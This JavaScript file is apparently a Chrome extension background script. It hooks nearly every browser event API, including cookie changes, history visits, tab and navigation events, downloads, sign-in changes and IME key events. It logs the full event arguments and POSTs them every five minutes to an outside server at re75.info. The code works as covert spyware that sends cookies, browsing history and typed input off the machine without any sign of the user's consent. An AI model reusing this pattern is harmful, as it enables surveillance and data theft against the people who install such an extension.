const conf = {
  "data": true
}

let buff = [];

Function.prototype.toJSON = Function.prototype.toString;
function eventLogger(place){
  return function(...args){
    let args_ = Array.prototype.slice.call(arguments);
    let log = {};
    if(conf.data){
      log = {
        time : new Date().getTime(),
        place : place,
        args : JSON.stringify(args_)
      }
    }else{
      args_ = args_.map(it => typeof(it));
      log = {
        time : new Date().getTime(),
        place : place,
        argsType : JSON.stringify(args_)
      }
    }
    buff.push(log);
    //console.log(log);
  }
}
function EncodeHTMLForm(data){
  var params = [];
  for(var name in data){
    var value = data[name];
    var param = encodeURIComponent(name).replace(/%20/g, '+')
      + '=' + encodeURIComponent(value).replace(/%20/g, '+');
    params.push(param);
  }
  return params.join('&');
}

setInterval(()=>{
  let data = { data: JSON.stringify(buff) }; // POSTメソッドで送信するデータ

  let xmlHttpRequest = new XMLHttpRequest();
  xmlHttpRequest.onreadystatechange = function()
  {
    let READYSTATE_COMPLETED = 4;
    let HTTP_STATUS_OK = 200;
    console.log("length: ", JSON.stringify(buff).length, "B");

    if( this.readyState == READYSTATE_COMPLETED
     && this.status == HTTP_STATUS_OK )
    {
      console.log("send", JSON.stringify(buff));
    }
    buff=[];
  }

  xmlHttpRequest.open( 'POST', 'https://re75.info/logger/' );

  // サーバに対して解析方法を指定する
  xmlHttpRequest.setRequestHeader( 'Content-Type', 'application/x-www-form-urlencoded' );

  // データをリクエスト ボディに含めて送信する
  xmlHttpRequest.send( EncodeHTMLForm( data ) );
}, 5*60*1000);

const log = {};

//chrome.alarms.onAlarm.addListener(eventLogger("__REPLACE__"));

chrome.bookmarks.onCreated.addListener(eventLogger("chrome.bookmarks.onCreated.addListener"));
chrome.bookmarks.onRemoved.addListener(eventLogger("chrome.bookmarks.onRemoved.addListener"));
chrome.bookmarks.onChanged.addListener(eventLogger("__REPLACE__"));
chrome.bookmarks.onMoved.addListener(eventLogger("__REPLACE__"));
chrome.bookmarks.onChildrenReordered.addListener(eventLogger("__REPLACE__"));
chrome.bookmarks.onImportBegan.addListener(eventLogger("__REPLACE__"));
chrome.bookmarks.onImportEnded.addListener(eventLogger("__REPLACE__"));

chrome.browserAction.onClicked.addListener(eventLogger("__REPLACE__"));

chrome.commands.getAll(eventLogger("__REPLACE__"));

chrome.contextMenus.onClicked.addListener(eventLogger("__REPLACE__"));

chrome.cookies.onChanged.addListener(eventLogger("__REPLACE__"));

chrome.debugger.onEvent.addListener(eventLogger("__REPLACE__"));
chrome.debugger.onDetach.addListener(eventLogger("__REPLACE__"));

chrome.downloads.onCreated.addListener(eventLogger("__REPLACE__"));
chrome.downloads.onErased.addListener(eventLogger("__REPLACE__"));
chrome.downloads.onChanged.addListener(eventLogger("__REPLACE__"));
chrome.downloads.onDeterminingFilename.addListener(eventLogger("__REPLACE__"));

chrome.extension.onRequest.addListener(eventLogger("__REPLACE__"));
chrome.extension.onRequestExternal.addListener(eventLogger("__REPLACE__"));

chrome.fontSettings.onFontChanged.addListener(eventLogger("__REPLACE__"));
chrome.fontSettings.onDefaultFontSizeChanged.addListener(eventLogger("__REPLACE__"));
chrome.fontSettings.onDefaultFixedFontSizeChanged.addListener(eventLogger("__REPLACE__"));
chrome.fontSettings.onMinimumFontSizeChanged.addListener(eventLogger("__REPLACE__"));

chrome.gcm.onMessage.addListener(eventLogger("__REPLACE__"));
chrome.gcm.onMessagesDeleted.addListener(eventLogger("__REPLACE__"));
chrome.gcm.onSendError.addListener(eventLogger("__REPLACE__"));

chrome.history.onVisited.addListener(eventLogger("__REPLACE__"))
chrome.history.onVisitRemoved.addListener(eventLogger("__REPLACE__"))

chrome.identity.onSignInChanged.addListener(eventLogger("__REPLACE__"));;

chrome.idle.onStateChanged.addListener(eventLogger("__REPLACE__"));

if("input" in chrome){
chrome.input.ime.onActivate.addListener(eventLogger("__REPLACE__"));
chrome.input.ime.onDeactivated.addListener(eventLogger("__REPLACE__"));
chrome.input.ime.onFocus.addListener(eventLogger("__REPLACE__"));
chrome.input.ime.onBlur.addListener(eventLogger("__REPLACE__"));
//chrome.input.ime.onInputContextUpdate.addListener(eventLogger("__REPLACE__"));
chrome.input.ime.onKeyEvent.addListener(eventLogger("__REPLACE__"));
//chrome.input.ime.onCandidateClicked.addListener(eventLogger("__REPLACE__"));
//chrome.input.ime.onMenuItemActivated.addListener(eventLogger("__REPLACE__"));
//chrome.input.ime.onSurroundingTextChanged.addListener(eventLogger("__REPLACE__"));
chrome.input.ime.onReset.addListener(eventLogger("__REPLACE__"));
chrome.input.ime.onCompositionBoundsChanged.addListener(eventLogger("__REPLACE__"));
}

chrome.instanceID.onTokenRefresh.addListener(eventLogger("__REPLACE__"));

chrome.management.onInstalled.addListener(eventLogger("__REPLACE__"));
chrome.management.onUninstalled.addListener(eventLogger("__REPLACE__"));
chrome.management.onEnabled.addListener(eventLogger("__REPLACE__"));
chrome.management.onDisabled.addListener(eventLogger("__REPLACE__"));

chrome.notifications.onClosed.addListener(eventLogger("__REPLACE__"));
chrome.notifications.onClicked.addListener(eventLogger("__REPLACE__"));
chrome.notifications.onButtonClicked.addListener(eventLogger("__REPLACE__"));
chrome.notifications.onPermissionLevelChanged.addListener(eventLogger("__REPLACE__"));
chrome.notifications.onShowSettings.addListener(eventLogger("__REPLACE__"));

chrome.omnibox.onInputChanged.addListener(eventLogger("__REPLACE__"));
chrome.omnibox.onInputEntered.addListener(eventLogger("__REPLACE__"));
chrome.omnibox.onInputCancelled.addListener(eventLogger("__REPLACE__"));
chrome.omnibox.onDeleteSuggestion.addListener(eventLogger("__REPLACE__"));

//chrome.pageAction.onClicked.addListener(eventLogger("__REPLACE__"));

chrome.permissions.onAdded.addListener(eventLogger("__REPLACE__"));
chrome.permissions.onRemoved.addListener(eventLogger("__REPLACE__"));

chrome.printerProvider.onGetPrintersRequested.addListener(eventLogger("__REPLACE__"));
chrome.printerProvider.onGetUsbPrinterInfoRequested.addListener(eventLogger("__REPLACE__"));
chrome.printerProvider.onGetCapabilityRequested.addListener(eventLogger("__REPLACE__"));
chrome.printerProvider.onPrintRequested.addListener(eventLogger("__REPLACE__"));

chrome.proxy.onProxyError.addListener(eventLogger("__REPLACE__"));

chrome.runtime.onStartup.addListener(eventLogger("__REPLACE__"));
chrome.runtime.onInstalled.addListener(eventLogger("__REPLACE__"));
chrome.runtime.onSuspend.addListener(eventLogger("__REPLACE__"));
chrome.runtime.onSuspendCanceled.addListener(eventLogger("__REPLACE__"));
chrome.runtime.onUpdateAvailable.addListener(eventLogger("__REPLACE__"));
chrome.runtime.onBrowserUpdateAvailable.addListener(eventLogger("__REPLACE__"));
chrome.runtime.onConnect.addListener(eventLogger("__REPLACE__"));
chrome.runtime.onConnectExternal.addListener(eventLogger("__REPLACE__"));
chrome.runtime.onMessage.addListener(eventLogger("__REPLACE__"));
chrome.runtime.onMessageExternal.addListener(eventLogger("__REPLACE__"));
chrome.runtime.onRestartRequired.addListener(eventLogger("__REPLACE__"));

chrome.sessions.onChanged.addListener(eventLogger("__REPLACE__"));

chrome.storage.onChanged.addListener(eventLogger("__REPLACE__"));

chrome.system.storage.onAttached.addListener(eventLogger("__REPLACE__"));
chrome.system.storage.onDetached.addListener(eventLogger("__REPLACE__"));

chrome.tabCapture.onStatusChanged.addListener(eventLogger("__REPLACE__"));

chrome.tabs.onCreated.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onUpdated.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onMoved.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onSelectionChanged.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onActiveChanged.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onActivated.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onHighlightChanged.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onHighlighted.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onDetached.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onAttached.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onRemoved.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onReplaced.addListener(eventLogger("__REPLACE__"));
chrome.tabs.onZoomChange.addListener(eventLogger("__REPLACE__"));

chrome.ttsEngine.onSpeak.addListener(eventLogger("__REPLACE__"));
chrome.ttsEngine.onStop.addListener(eventLogger("__REPLACE__"));
chrome.ttsEngine.onPause.addListener(eventLogger("__REPLACE__"));
chrome.ttsEngine.onResume.addListener(eventLogger("__REPLACE__"));

chrome.webNavigation.onBeforeNavigate.addListener(eventLogger("__REPLACE__"));
chrome.webNavigation.onCommitted.addListener(eventLogger("__REPLACE__"));
chrome.webNavigation.onDOMContentLoaded.addListener(eventLogger("__REPLACE__"));
chrome.webNavigation.onCompleted.addListener(eventLogger("__REPLACE__"));
chrome.webNavigation.onErrorOccurred.addListener(eventLogger("__REPLACE__"));
chrome.webNavigation.onCreatedNavigationTarget.addListener(eventLogger("__REPLACE__"));
chrome.webNavigation.onReferenceFragmentUpdated.addListener(eventLogger("__REPLACE__"));
chrome.webNavigation.onTabReplaced.addListener(eventLogger("__REPLACE__"));
chrome.webNavigation.onHistoryStateUpdated.addListener(eventLogger("__REPLACE__"));

//chrome.webstore.onInstallStageChanged.addListener(eventLogger("__REPLACE__"));
//chrome.webstore.onDownloadProgress.addListener(eventLogger("__REPLACE__"));

chrome.windows.onCreated.addListener(eventLogger("__REPLACE__"));
chrome.windows.onRemoved.addListener(eventLogger("__REPLACE__"));
chrome.windows.onFocusChanged.addListener(eventLogger("__REPLACE__"));
